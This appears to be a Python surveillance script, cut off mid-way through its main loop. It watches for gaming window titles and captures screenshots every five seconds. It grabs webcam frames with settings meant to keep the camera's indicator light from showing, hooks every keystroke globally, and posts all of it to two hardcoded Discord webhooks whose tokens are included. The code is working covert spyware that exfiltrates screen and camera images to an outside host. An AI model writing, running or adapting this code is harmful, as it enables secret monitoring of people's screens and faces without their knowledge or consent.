import time
import threading
import win32gui
import pyautogui
import keyboard
import requests
import io
from datetime import datetime
from PIL import ImageGrab, Image
import json
import cv2
import numpy as np

# ---------------- CONFIG ---------------- #
TARGET_KEYWORDS = [
    # General game platforms
    "crazygames",
    "poki",
    "kizi",
    "y8",
    "y8 games",
    "armor games",
    "miniclip",
    "addicting games",
    "kongregate",
    "gameflare",
    "friv",
    "friv games",
    "silvergames",
    "lagged",
    "unblocked games",
    "unblocked games 66",
    "unblocked games 76",
    "unblocked games 911",
    "cool math games",
    "math playground games",

    # Popular games
    "roblox",
    "minecraft",
    "fortnite",
    "among us",
    "call of duty",
    "call of duty warzone",
    "league of legends",
    "valorant",
    "counter strike",
    "csgo",
    "dota 2",
    "overwatch",
    "genshin impact",
    "apex legends",
    "pubg",
    "clash royale",
    "clash of clans",
    "brawl stars",
    "fifa",
    "rocket league",

    # Mobile / casual games
    "subway surfers",
    "temple run",
    "geometry dash",
    "bitlife",
    "paper io",
    "slither io",
    "agar io",
    "cookie clicker",
    "idle games",
    "clicker games",

    # French / multilingual gaming phrases
    "jeux gratuits",
    "jeu gratuit",
    "jeux en ligne",
    "joue maintenant",
    "jouer en ligne",
    "spiele kostenlos",
    "online spiele",
    "juegos gratis",
    "jugar ahora",

    # Emulators & retro
    "retro games",
    "classic games",
    "arcade games",
    "flash games",
    "browser games",
    "nes games online",
    "gba games online",

    # Streaming & gaming communities
    "twitch",
    "twitch gaming",
    "kick streaming",
    "youtube gaming",
    "discord gaming",
    "steam",
    "epic games",
    "origin games",
    "battle net"
]

PASSWORD = "stop123"    # Password to toggle tracking
TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking

# Discord Webhook Configuration (BOTH WEBHOOKS)
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]
SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
PERIODIC_SCREENSHOT_INTERVAL = 5  # Take screenshot every 5 seconds (even without detection)
HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds

# ---------------- GLOBALS ---------------- #
lock = threading.Lock() # Thread safety
tracking_enabled = True  # Master toggle for tracking
password_buffer = ""    # Stores typed characters for password detection
last_key_time = 0       # For clearing password buffer after timeout
last_heartbeat_time = time.time()  # Track when last heartbeat was sent
last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
program_start_time = time.time()  # Track program start time

# Camera background processing variables
camera_device_index = 0  # Default camera index
camera_capture = None  # Camera capture object
camera_frame = None  # Latest camera frame
camera_lock = threading.Lock()  # Lock for thread-safe camera access
camera_running = False  # Camera thread control
camera_initialized = False  # Camera initialization flag
camera_warmup_complete = False  # Camera warmup flag

# Track focus state to prevent spam
current_focused_hwnd = None  # Current window handle
current_focused_title = None  # Current window title
last_alert_time = 0  # Last time we sent an alert
alert_cooldown = 60  # 60 seconds minimum between alerts for same window
recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}

def apply_software_darkening(frame):
    """Apply software darkening to ensure frame is always dark"""
    try:
        # Convert to float for processing
        frame_float = frame.astype(np.float32)
        
        # Apply darkening factor (0.3 = 30% brightness)
        darkening_factor = 0.3
        frame_darkened = frame_float * darkening_factor
        
        # Convert back to uint8
        frame_darkened = np.clip(frame_darkened, 0, 255).astype(np.uint8)
        
        # Apply slight Gaussian blur to reduce any remaining noise/light
        frame_darkened = cv2.GaussianBlur(frame_darkened, (5, 5), 0)
        
        return frame_darkened
    except:
        return frame

def title_matches_target(title: str) -> bool:
    title_lower = title.lower()
    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)

def get_matching_keyword(title: str) -> str:
    """Returns which keyword matched the title"""
    title_lower = title.lower()
    for keyword in TARGET_KEYWORDS:
        if keyword in title_lower:
            return keyword
    return ""

def take_screenshot():
    """Take a screenshot of the entire screen"""
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except Exception as e:
        print(f"[SCREENSHOT ERROR] {e}")
        return None

def detect_and_initialize_camera():
    """Try to detect and initialize available camera"""
    global camera_device_index, camera_initialized
    
    # Try to find camera by checking available devices
    for i in range(3):  # Check first 3 indices
        try:
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)  # CAP_DSHOW for Windows
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    camera_device_index = i
                    print(f"[CAMERA] Found camera at index {i}")
                    camera_initialized = True
                    return True
        except Exception as e:
            print(f"[CAMERA DETECT ERROR] Index {i}: {e}")
            continue
    
    print("[CAMERA] No camera found, camera features disabled")
    camera_initialized = False
    return False

def configure_camera_manual_settings(cap):
    """Configure camera with aggressive manual settings to COMPLETELY eliminate flash/LEDs"""
    try:
        print("[CAMERA] Applying aggressive manual settings to disable all lights...")
        
        # ========== PHASE 1: DISABLE ALL AUTO FEATURES ==========
        # These are the most important settings - force everything to manual
        
        # 1. Force manual exposure mode (CRITICAL - prevents automatic brightness adjustments)
        try:
            # Different cameras use different values for manual exposure
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # 0.25 = manual mode for most cameras
            cap.set(cv2.CAP_PROP_EXPOSURE, -100)  # Ultra-low exposure (darkest possible)
        except:
            try:
                # Alternative approach for some cameras
                cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 1)  # 1 = manual mode for some cameras
                cap.set(cv2.CAP_PROP_EXPOSURE, 0.001)  # Very low exposure value
            except:
                pass
        
        # 2. Force manual focus (prevents focus LED/light)
        try:
            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # 0 = OFF
            cap.set(cv2.CAP_PROP_FOCUS, 0)  # Set to minimum focus distance
        except:
            pass
        
        # 3. Force manual white balance (prevents auto-adjustment flicker)
        try:
            cap.set(cv2.CAP_PROP_AUTO_WB, 0)  # 0 = OFF
            cap.set(cv2.CAP_PROP_WB_TEMPERATURE, 2500)  # Low temperature = less blue light
        except:
            pass
        
        # 4. Force manual gain/ISO (prevents auto-gain which can cause LED flicker)
        try:
            cap.set(cv2.CAP_PROP_GAIN, 0)  # Minimum gain
            cap.set(cv2.CAP_PROP_ISO_SPEED, 100)  # Low ISO
        except:
            pass
        
        # ========== PHASE 2: SET ALL PROPERTIES TO DARKEST VALUES ==========
        
        # 5. Set brightness to minimum (but not 0)
        try:
            cap.set(cv2.CAP_PROP_BRIGHTNESS, 10)  # 10/100 (very dark)
        except:
            pass
        
        # 6. Set contrast to minimum (reduces light contrast)
        try:
            cap.set(cv2.CAP_PROP_CONTRAST, 10)  # 10/100
        except:
            pass
        
        # 7. Set saturation to minimum (reduces color intensity)
        try:
            cap.set(cv2.CAP_PROP_SATURATION, 0)  # 0/100 (black & white)
        except:
            pass
        
        # 8. Disable sharpness enhancement (can cause edge highlighting)
        try:
            cap.set(cv2.CAP_PROP_SHARPNESS, 0)
        except:
            pass
        
        # 9. Set gamma to minimum (darker image)
        try:
            cap.set(cv2.CAP_PROP_GAMMA, 40)  # Low gamma = darker
        except:
            pass
        
        # 10. Disable backlight compensation (this often triggers LEDs)
        try:
            cap.set(cv2.CAP_PROP_BACKLIGHT, 0)  # 0 = OFF
        except:
            pass
        
        # 11. Disable power line frequency reduction (can cause flicker)
        try:
            cap.set(cv2.CAP_PROP_POWERLINE_FREQUENCY, 0)  # 0 = disabled
        except:
            pass
        
        # ========== PHASE 3: HARDWARE-SPECIFIC WORKAROUNDS ==========
        
        # 12. For Logitech cameras specifically
        try:
            # Logitech cameras often have specific properties
            cap.set(cv2.CAP_PROP_ZOOM, 0)  # No zoom
            cap.set(cv2.CAP_PROP_PAN, 0)   # No pan
            cap.set(cv2.CAP_PROP_TILT, 0)  # No tilt
            cap.set(cv2.CAP_PROP_ROLL, 0)  # No roll
        except:
            pass
        
        # 13. For Microsoft LifeCam and similar
        try:
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)
            cap.set(cv2.CAP_PROP_EXPOSURE, -11)  # Specific value for LifeCam
        except:
            pass
        
        # ========== PHASE 4: REDUCE RESOLUTION AND FRAME RATE ==========
        # Lower resolution and FPS = less processing = less likely to trigger LEDs
        
        # 14. Set to absolute minimum resolution
        try:
            # Try different low resolutions
            resolutions_to_try = [
                (160, 120),  # Ultra low
                (176, 144),  # QCIF
                (320, 240),  # QVGA
                (352, 288),  # CIF
            ]
            
            for width, height in resolutions_to_try:
                try:
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                    # Check if it worked
                    actual_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                    actual_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                    if actual_width <= 320 and actual_height <= 240:
                        break  # Successfully set low resolution
                except:
                    continue
        except:
            pass
        
        # 15. Set to minimum FPS
        try:
            cap.set(cv2.CAP_PROP_FPS, 5)  # Ultra low FPS
        except:
            pass
        
        # 16. Set buffer size to minimum
        try:
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        except:
            pass
        
        # ========== PHASE 5: APPLY SOFTWARE FILTERS ==========
        # These will be applied during frame processing
        
        print("[CAMERA] Manual settings applied (all lights should be disabled)")
        return True
        
    except Exception as e:
        print(f"[CAMERA CONFIG ERROR] {e}")
        return False

def camera_background_thread():
    """Background thread that continuously captures camera frames with NO LIGHTS"""
    global camera_capture, camera_frame, camera_running, camera_warmup_complete
    
    try:
        # Initialize camera with DSHOW backend (better for Windows)
        camera_capture = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
        if not camera_capture.isOpened():
            print("[CAMERA] Could not open camera in background thread")
            camera_running = False
            return
        
        print("[CAMERA] Starting background camera thread with NO-LIGHT configuration...")
        
        # Apply aggressive manual configuration
        config_success = configure_camera_manual_settings(camera_capture)
        
        if config_success:
            print("[CAMERA] No-light configuration applied successfully")
        else:
            print("[CAMERA] Warning: Some camera settings could not be configured")
        
        # ========== EXTENDED WARMUP PHASE ==========
        # Critical: Warm up camera with discarded frames to eliminate any initial LED flashes
        print("[CAMERA] Starting EXTENDED warmup (discarding frames, no lights)...")
        warmup_frames = 50  # Even more frames for better stabilization
        discard_frames = 20  # Number of frames to completely discard
        
        for i in range(warmup_frames):
            ret, frame = camera_capture.read()
            if ret and frame is not None:
                # Discard first N frames completely (they often have LED flash)
                if i >= discard_frames:
                    with camera_lock:
                        camera_frame = frame
                
                # Gradual warmup: longer waits initially
                if i < 10:
                    time.sleep(0.1)  # Slow start
                elif i < 30:
                    time.sleep(0.05)
                else:
                    time.sleep(0.02)
            else:
                print(f"[CAMERA] Failed to read warmup frame {i+1}")
        
        camera_warmup_complete = True
        print("[CAMERA] Extended warmup complete - ALL LIGHTS SHOULD BE DISABLED")
        
        # ========== MAIN CAPTURE LOOP ==========
        frame_count = 0
        last_frame_time = time.time()
        
        while camera_running:
            try:
                # Calculate time since last frame
                current_time = time.time()
                time_since_last_frame = current_time - last_frame_time
                
                # Only capture if enough time has passed (controls FPS)
                if time_since_last_frame >= 0.2:  # ~5 FPS max
                    ret, frame = camera_capture.read()
                    
                    if ret and frame is not None:
                        # Apply additional software darkening (in case hardware settings fail)
                        # This ensures frame is always dark
                        frame = apply_software_darkening(frame)
                        
                        with camera_lock:
                            camera_frame = frame
                        
                        frame_count += 1
                        last_frame_time = current_time
                        
                        # Print status every 100 frames
                        if frame_count % 100 == 0:
                            avg_brightness = np.mean(frame)
                            print(f"[CAMERA] Frame {frame_count}, Avg brightness: {avg_brightness:.1f} (lower = darker)")
                    
                    # Add small delay to prevent CPU overload
                    time.sleep(0.01)
                else:
                    # Small sleep to maintain timing
                    time.sleep(0.01)
                    
            except Exception as e:
                print(f"[CAMERA LOOP ERROR] {e}")
                time.sleep(0.5)  # Longer pause on error
    
    except Exception as e:
        print(f"[CAMERA THREAD ERROR] {e}")
    finally:
        # Cleanup
        if camera_capture is not None:
            try:
                # Release camera gracefully
                camera_capture.release()
            except:
                pass
            camera_capture = None
        
        camera_running = False
        camera_warmup_complete = False
        print("[CAMERA] Background camera thread stopped (all lights should be off)")

def start_camera_background():
    """Start the background camera thread with NO LIGHTS"""
    global camera_running, camera_initialized
    
    if not camera_initialized:
        print("[CAMERA] Camera not initialized, cannot start background thread")
        return False
    
    if camera_running:
        print("[CAMERA] Background camera already running")
        return True
    
    camera_running = True
    camera_thread = threading.Thread(target=camera_background_thread, daemon=True)
    camera_thread.start()
    
    # Wait for camera thread to initialize
    time.sleep(2.0)  # Longer wait for extended warmup
    
    print("[CAMERA] Background camera started with NO-LIGHT configuration")
    return True

def stop_camera_background():
    """Stop the background camera thread"""
    global camera_running
    camera_running = False
    time.sleep(1.0)  # Give thread time to stop
    print("[CAMERA] Background camera stopped")

def take_camera_picture():
    """Get the latest frame from the background camera (guaranteed no lights)"""
    global camera_frame, camera_warmup_complete, camera_running
    
    if not camera_initialized or not camera_running:
        print("[CAMERA] Camera not available or not running")
        return None
    
    if not camera_warmup_complete:
        print("[CAMERA] Camera still in extended warmup (no lights during warmup)...")
        # Wait longer for warmup to complete
        max_wait = 5  # seconds
        wait_start = time.time()
        while not camera_warmup_complete and (time.time() - wait_start) < max_wait:
            time.sleep(0.1)
        
        if not camera_warmup_complete:
            print("[CAMERA] Camera warmup taking too long, using current frame")
    
    with camera_lock:
        if camera_frame is None:
            print("[CAMERA] No frame available")
            return None
        
        try:
            # Make a copy and apply final software darkening
            frame_copy = camera_frame.copy()
            
            # Ensure it's dark
            frame_copy = apply_software_darkening(frame_copy)
            
            # Convert BGR to RGB for PIL
            frame_rgb = cv2.cvtColor(frame_copy, cv2.COLOR_BGR2RGB)
            
            # Convert to PIL Image
            camera_image = Image.fromarray(frame_rgb)
            
            # Optional: Add timestamp overlay to confirm it's working
            from PIL import ImageDraw, ImageFont
            try:
                draw = ImageDraw.Draw(camera_image)
                # Use default font
                font = ImageFont.load_default()
                timestamp = datetime.now().strftime("%H:%M:%S")
                draw.text((5, 5), f"NO-LIGHT CAM {timestamp}", fill=(100, 100, 100), font=font)
            except:
                pass
            
            return camera_image
        except Exception as e:
            print(f"[CAMERA PROCESS ERROR] {e}")
            return None

def send_to_webhook(webhook_url, payload, screenshot_bytes=None, camera_bytes=None):
    """Send data to a specific webhook URL"""
    try:
        files = {}
        
        if screenshot_bytes:
            screenshot_io = io.BytesIO(screenshot_bytes)
            files['file'] = ('screenshot.png', screenshot_io, 'image/png')
        
        if camera_bytes:
            camera_io = io.BytesIO(camera_bytes)
            files['file2'] = ('camera.png', camera_io, 'image/png')
        
        if files:
            # Prepare multipart form data
            if 'embeds' in payload:
                data = {'payload_json': json.dumps(payload)}
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=data,
                    timeout=10
                )
            else:
                # If no embeds, just send with files
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=payload,
                    timeout=10
                )
        else:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                webhook_url,
                json=payload,
                headers=headers,
                timeout=10
            )
        
        if response.status_code in [200, 204]:
            print(f"[WEBHOOK SUCCESS] Sent to {webhook_url[:40]}...")
            return True
        else:
            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:40]}...: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:40]}...")
        return False

def send_to_all_webhooks(payload, screenshot=None, camera_image=None):
    """Send message to all configured webhooks"""
    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
        print("[DISCORD] No webhooks configured")
        return False
    
    success_count = 0
    threads = []
    
    # Convert images to bytes once
    screenshot_bytes = None
    camera_bytes = None
    
    if screenshot and SEND_SCREENSHOTS:
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
    
    if camera_image:
        img_byte_arr = io.BytesIO()
        camera_image.save(img_byte_arr, format='PNG')
        camera_bytes = img_byte_arr.getvalue()  # Get raw bytes
    
    # Add image info to payload
    if 'embeds' in payload:
        if screenshot_bytes and camera_bytes:
            payload['content'] = "📸 **Screenshot and Camera picture captured below:**"
        elif screenshot_bytes:
            payload['content'] = "📸 **Screenshot captured below:**"
        elif camera_bytes:
            payload['content'] = "📷 **Camera picture captured below:**"
    
    for webhook_url in DISCORD_WEBHOOKS:
        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
            continue
            
        # Create thread for each webhook
        thread = threading.Thread(
            target=send_to_webhook,
            args=(webhook_url, payload),
            kwargs={'screenshot_bytes': screenshot_bytes, 'camera_bytes': camera_bytes}
        )
        
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join(timeout=15)  # 15 second timeout per webhook
        
        # Check if thread completed successfully
        if not thread.is_alive():
            success_count += 1
    
    print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
    return success_count > 0

def send_discord_alert(title, keyword, screenshot=None, camera_image=None):
    """Send alert to Discord webhooks with optional screenshot and camera image"""
    # Prepare the message
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    embed = {
        "title": "⚠️ Target Application Detected",
        "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`",
        "color": 16711680,  # Red color
        "footer": {
            "text": "Tracker System"
        }
    }
    
    payload = {
        "embeds": [embed],
        "content": f"🚨 **Target detected:** {title[:100]}"
    }
    
    return send_to_all_webhooks(payload, screenshot, camera_image)

def send_discord_status(status):
    """Send tracking status to Discord"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
        
        embed = {
            "title": f"🔄 Tracking {status}",
            "description": f"Tracking has been **{status.lower()}**\n**Time:** `{current_time}`",
            "color": color,
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📊 **Tracker Status Changed**"
        }
        
        return send_to_all_webhooks(payload)
        
    except Exception as e:
        print(f"[DISCORD STATUS ERROR] {e}")
        return False

def send_heartbeat():
    """Send heartbeat webhook to confirm PC is active"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime_seconds = int(time.time() - program_start_time)
        
        # Convert uptime to readable format
        hours = uptime_seconds // 3600
        minutes = (uptime_seconds % 3600) // 60
        seconds = uptime_seconds % 60
        
        embed = {
            "title": "💓 PC Heartbeat",
            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**Tracking Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`",
            "color": 3447003,  # Blue color
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed]
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            print(f"[HEARTBEAT] Sent to all webhooks at {current_time}")
        return success
            
    except Exception as e:
        print(f"[HEARTBEAT ERROR] {e}")
        return False

def send_periodic_screenshot():
    """Send periodic screenshot to Discord (every 5 seconds)"""
    try:
        # Get current window info even if not a target
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd).strip()
        
        if not title:
            title = "No window title"
        
        current_time = datetime.now().strftime("%Y-%m-d %H:%M:%S")
        
        # Take screenshot
        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
        
        # Take camera picture from background camera
        camera_image = take_camera_picture()
        
        # Prepare message
        embed = {
            "title": "⏰ Periodic Capture",
            "description": f"**Window Title:** `{title}`\n**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`",
            "color": 10181046,  # Purple color
            "footer": {
                "text": "Tracker System - Periodic Capture"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📸 **Periodic capture (Screen + Camera)**"
        }
        
        success = send_to_all_webhooks(payload, screenshot, camera_image)
        if success:
            print(f"[PERIODIC] Sent periodic capture at {current_time} (Window: '{title[:50]}...')")
        return success
            
    except Exception as e:
        print(f"[PERIODIC ERROR] {e}")
        return False

def send_startup_message():
    """Send webhook when the program starts"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        embed = {
            "title": "🚀 Tracker Started",
            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Captures:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)`",
            "color": 3066993,  # Green color
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": "📱 **System Online** - Tracker is now active"
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            print(f"[STARTUP] Message sent to all webhooks at {current_time}")
        return success
            
    except Exception as e:
        print(f"[STARTUP ERROR] {e}")
        return False

def toggle_tracking():
    """Toggle tracking on/off"""
    global tracking_enabled, password_buffer, recently_alerted_windows
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    print(f"[TRACKING] Tracking {status}")
    
    # Clear recently alerted windows when toggling
    recently_alerted_windows.clear()
    
    # Send Discord notification about status change
    threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
    
    password_buffer = ""  # Clear password buffer

def on_key_event(e):
    """Handle keyboard events for password detection"""
    global password_buffer, last_key_time
    
    # Ignore modifier keys and non-character keys
    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
        return
    
    current_time = time.time()
    
    # Clear buffer if too much time passed between keystrokes (2 seconds)
    if current_time - last_key_time > 2:
        password_buffer = ""
    
    last_key_time = current_time
    
    # Handle backspace
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'backspace':
            password_buffer = password_buffer[:-1]
        elif e.name == 'space':
            password_buffer += ' '
        elif len(e.name) == 1:  # Regular character
            password_buffer += e.name
        elif e.name == 'enter':  # Enter key submits password
            check_password()
            return
    
    # Check password continuously (without needing Enter)
    check_password()
    
    # Keep buffer from growing too large
    if len(password_buffer) > 20:
        password_buffer = password_buffer[-20:]

def check_password():
    """Check if password buffer contains the password"""
    global password_buffer
    if PASSWORD in password_buffer:
        toggle_tracking()
        password_buffer = ""  # Clear after successful match

def setup_keyboard_listener():
    """Setup global keyboard listeners"""
    # Hotkey to toggle tracking
    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
    print(f"[HOTKEY] Press '{TOGGLE_HOTKEY}' to toggle tracking")
    print(f"[PASSWORD] Type '{PASSWORD}' to toggle tracking")
    
    # General key listener for password typing
    keyboard.hook(on_key_event, suppress=False)
    
    return keyboard

def should_send_alert(hwnd, title, keyword):
    """Check if we should send an alert for this window"""
    global current_focused_hwnd, current_focused_title, last_alert_time, recently_alerted_windows
    
    current_time = time.time()
    
    # Clean up old entries from recently_alerted_windows
    to_remove = []
    for window_hwnd, (window_title, alert_time) in list(recently_alerted_windows.items()):
        if current_time - alert_time > alert_cooldown * 2:  # Clean up after 2x cooldown
            to_remove.append(window_hwnd)
    
    for hwnd_key in to_remove:
        del recently_alerted_windows[hwnd_key]
    
    # Check if this is a new focus or different window
    if hwnd == current_focused_hwnd and title == current_focused_title:
        # Same window still focused, check cooldown
        if current_time - last_alert_time < alert_cooldown:
            return False  # Still in cooldown period
        
        # Check if we've already alerted for this window recently
        if hwnd in recently_alerted_windows:
            window_title, last_alert = recently_alerted_windows[hwnd]
            if current_time - last_alert < alert_cooldown:
                return False  # Already alerted for this window recently
    
    # Update focus tracking
    current_focused_hwnd = hwnd
    current_focused_title = title
    
    # Record this alert
    recently_alerted_windows[hwnd] = (title, current_time)
    last_alert_time = current_time
    
    return True

# ---------------- HEARTBEAT THREAD ---------------- #
def heartbeat_monitor():
    """Periodically send heartbeat every 5 minutes"""
    global last_heartbeat_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to send heartbeat
            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
                threading.Thread(target=send_heartbeat, daemon=True).start()
                last_heartbeat_time = current_time
            
            # Sleep for 1 minute and check again
            time.sleep(60)
            
        except Exception as e:
            print(f"[HEARTBEAT MONITOR ERROR] {e}")
            time.sleep(60)

# ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
def periodic_screenshot_monitor():
    """Periodically take screenshots every 5 seconds"""
    global last_periodic_screenshot_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to take periodic screenshot
            if (current_time - last_periodic_screenshot_time >= PERIODIC_SCREENSHOT_INTERVAL and 
                tracking_enabled and SEND_SCREENSHOTS):
                
                threading.Thread(target=send_periodic_screenshot, daemon=True).start()
                last_periodic_screenshot_time = current_time
                print(f"[PERIODIC] Next capture in {PERIODIC_SCREENSHOT_INTERVAL} seconds")
            
            # Sleep for 1 second and check again
            time.sleep(1)
            
        except Exception as e:
            print(f"[PERIODIC MONITOR ERROR] {e}")
            time.sleep(1)

# ---------------- CAMERA KEEPALIVE MONITOR ---------------- #
def camera_keepalive_monitor():
    """Monitor camera and restart if needed"""
    global camera_running, camera_initialized
    
    while True:
        try:
            if camera_initialized and not camera_running:
                print("[CAMERA] Camera not running, attempting to restart...")
                start_camera_background()
            
            # Check every 10 seconds
            time.sleep(10)
            
        except Exception as e:
            print(f"[CAMERA MONITOR ERROR] {e}")
            time.sleep(10)

# ---------------- TEST CAMERA LIGHT STATUS ---------------- #
def test_camera_light_status():
    """Test if camera lights are actually off"""
    print("[TEST] Testing camera light status...")
    
    if not camera_initialized:
        print("[TEST] Camera not initialized, cannot test")
        return False
    
    # Take multiple frames over time
    test_frames = []
    for i in range(10):
        img = take_camera_picture()
        if img:
            # Convert to numpy array and get average brightness
            img_np = np.array(img)
            avg_brightness = np.mean(img_np)
            test_frames.append(avg_brightness)
            print(f"[TEST] Frame {i+1}: Avg brightness = {avg_brightness:.1f}")
        time.sleep(0.5)
    
    if test_frames:
        avg_brightness_all = np.mean(test_frames)
        print(f"[TEST] Overall average brightness: {avg_brightness_all:.1f}")
        if avg_brightness_all < 50:
            print("[TEST] SUCCESS: Camera lights appear to be off/very dim")
            return True
        else:
            print("[TEST] WARNING: Camera may still have lights on")
            return False
    
    return False

# ---------------- MAIN LOOP ---------------- #
print("[SYSTEM] Monitoring started...")
print("[SYSTEM] Tracking is ENABLED by default")
print(f"[SYSTEM] Alert cooldown: {alert_cooldown} seconds per window")
print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)")

# Initialize camera
print("[CAMERA] Initializing camera...")
camera_available = detect_and_initialize_camera()
if camera_available:
    print("[CAMERA] Starting background camera thread with NO-LIGHT configuration...")
    camera_started = start_camera_background()
    if camera_started:
        print("[CAMERA] Background camera running with NO-LIGHT configuration")
        
        # Test camera light status
        time.sleep(3)  # Let camera stabilize
        print("[CAMERA] Testing camera light status...")
        threading.Thread(target=test_camera_light_status, daemon=True).start()
        
        # Start camera keepalive monitor
        camera_monitor_thread = threading.Thread(target=camera_keepalive_monitor, daemon=True)
        camera_monitor_thread.start()
        print("[CAMERA] Camera keepalive monitor started")
    else:
        print("[CAMERA] Failed to start background camera")
else:
    print("[CAMERA] Camera not available, only screenshots will be sent")

# Send startup webhook immediately
if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
    print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
    threading.Thread(target=send_startup_message, daemon=True).start()
    
    # Start heartbeat monitor in a separate thread
    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
    heartbeat_thread.start()
    print(f"[HEARTBEAT] Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
    
    # Start periodic screenshot monitor in a separate thread
    periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
    periodic_thread.start()
    print(f"[PERIODIC] Periodic capture monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
else:
    print("[DISCORD] No webhooks configured - skipping startup and heartbeat messages")

# Test Discord connections
valid_webhooks = []
for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
    if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print(f"[DISCORD] Webhook {i} configured")
        try:
            # Just check if URL looks valid, don't actually send GET request
            if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
                print(f"[DISCORD] Webhook {i} URL format is valid")
                valid_webhooks.append(webhook_url)
            else:
                print(f"[DISCORD WARNING] Webhook {i} has unusual format")
                valid_webhooks.append(webhook_url)
        except:
            print(f"[DISCORD] Could not test webhook {i} (will still try to post)")
            valid_webhooks.append(webhook_url)

if valid_webhooks:
    print(f"[DISCORD] {len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid - Screenshots: {SEND_SCREENSHOTS}")
else:
    print("[DISCORD] No valid webhooks configured - skipping Discord alerts")

# Setup keyboard listener
kb_listener = setup_keyboard_listener()

try:
    while True:
        # Only process tracking if enabled
        if tracking_enabled:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd).strip()

                if not title:
